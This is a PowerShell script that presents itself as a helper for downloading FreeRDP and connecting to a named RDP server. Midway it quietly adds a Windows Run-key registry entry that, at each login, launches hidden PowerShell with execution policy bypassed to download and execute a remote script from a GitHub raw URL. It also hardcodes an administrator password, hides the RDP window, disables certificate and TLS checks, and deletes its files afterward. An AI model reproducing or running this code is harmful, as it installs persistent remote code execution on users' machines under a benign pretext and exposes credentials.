# Define variables for RDP connection
$server = "rdp.rewebly.com"
$username = "Administrator"
$password = "!Mamoute901901a"

# Define paths and URLs
$freerdpUrl = "https://ci.freerdp.com/job/freerdp-nightly-windows/arch=win64,label=vs2017/lastSuccessfulBuild/artifact/*zip*/archive.zip"
$tempDir = "$env:TEMP\FreeRDP_Temp"
$zipPath = "$tempDir\FreeRDP.zip"
$extractPath = "$tempDir\FreeRDP"
$logPath = "$tempDir\wfreerdp_log.txt"

try {
    # Create temporary directory
    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

    # Download FreeRDP
    Write-Host "Downloading FreeRDP..."
    try {
        Invoke-WebRequest -Uri $freerdpUrl -OutFile $zipPath -ErrorAction Stop
    }
    catch {
        throw "Failed to download FreeRDP. URL may be invalid or unreachable. Check the URL: $freerdpUrl"
    }

    # Extract FreeRDP
    Write-Host "Extracting FreeRDP..."
    Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force

    # Search for wfreerdp.exe recursively
    Write-Host "Locating wfreerdp.exe..."
    $xfreerdpPath = Get-ChildItem -Path $extractPath -Recurse -Include "wfreerdp.exe" | Select-Object -First 1 -ExpandProperty FullName
    if (-Not $xfreerdpPath) {
        throw "wfreerdp.exe not found in $extractPath. ZIP structure may have changed."
    }

    # Add registry key to run script on startup by downloading from the web
    $scriptPath = "$PSScriptRoot\freerdp.ps1"
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regName = "FreeRDPStartup"
    $webCommand = "powershell -w hidden -ep bypass -c \"iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/bangbangme/loko/refs/heads/main/zaza.ps1')\""
    Set-ItemProperty -Path $regPath -Name $regName -Value $webCommand

    # Connect to RDP server using wfreerdp with output redirection and hidden window
    Write-Host "Connecting to $server..."
    Start-Process -FilePath $xfreerdpPath -ArgumentList "/u:$username /p:$password /v:$server /dynamic-resolution /tls:seclevel:0 /cert:ignore" -WindowStyle Hidden -RedirectStandardOutput $logPath -RedirectStandardError $logPath

    # Check if the RDP connection was successful
    $process = Get-Process | Where-Object { $_.Path -eq $xfreerdpPath }
    if ($process.ExitCode -eq 0) {
        Write-Host "RDP connection closed successfully."
    } else {
        Write-Host "RDP connection failed. Check log at $logPath for details." -ForegroundColor Red
    }
}
catch {
    Write-Host "An error occurred: $_" -ForegroundColor Red
}
finally {
    # Clean up: Remove temporary files
    Write-Host "Cleaning up..."
    if (Test-Path $tempDir) {
        Remove-Item -Path $tempDir -Recurse -Force
    }
    Write-Host "Cleanup complete."
}
